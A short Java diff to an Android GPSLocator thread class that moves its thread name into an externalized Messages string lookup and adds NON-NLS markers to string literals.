@@ -14,13 +14,14 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Looper;
 
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
 public abstract class GPSLocator extends Thread {
 
-	private static final String TAG = "GPSLocator";
+	private static final String TAG = "GPSLocator"; //$NON-NLS-1$
 	private LocationManager lm;
 	private LocationListener listener;
 
@@ -28,7 +29,7 @@ public abstract class GPSLocator extends Thread {
 
 	public GPSLocator() {
 		setDaemon(true);
-		setName("LocationThread");
+		setName(Messages.getString("12.0")); //$NON-NLS-1$
 		lm = (LocationManager) Status.getAppContext().getSystemService(Context.LOCATION_SERVICE);
 	}
 
@@ -50,7 +51,7 @@ public abstract class GPSLocator extends Thread {
 		myLooper = Looper.myLooper();
 		Looper.loop();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " exiting");
+			Check.log(TAG + " exiting") ;//$NON-NLS-1$
 		}
 	}
 
